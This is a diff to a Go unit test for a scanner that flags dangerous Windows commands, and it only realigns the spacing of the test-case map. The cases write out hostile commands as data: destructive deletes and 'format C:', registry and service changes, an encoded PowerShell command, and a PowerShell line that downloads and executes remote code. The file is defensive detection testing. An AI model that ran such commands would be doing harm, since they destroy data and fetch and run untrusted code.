@@ -4,13 +4,13 @@ import "testing"
 
 func TestScanDanger(t *testing.T) {
 	cases := map[string]string{
-		"rd /s /q C:\\stuff":       "recursive_delete",
-		"format C:":                "format",
-		"reg add HKLM\\Software\\X": "registry_add",
-		"sc create MyService":      "service_create",
+		"rd /s /q C:\\stuff":              "recursive_delete",
+		"format C:":                       "format",
+		"reg add HKLM\\Software\\X":       "registry_add",
+		"sc create MyService":             "service_create",
 		"powershell -EncodedCommand AAAA": "encoded_command",
 		"iex(New-Object Net.WebClient).DownloadString('http://x')": "iex_download",
-		"del /f /s *.tmp":          "force_delete",
+		"del /f /s *.tmp": "force_delete",
 	}
 	for script, wantRule := range cases {
 		fs := Scan(script)
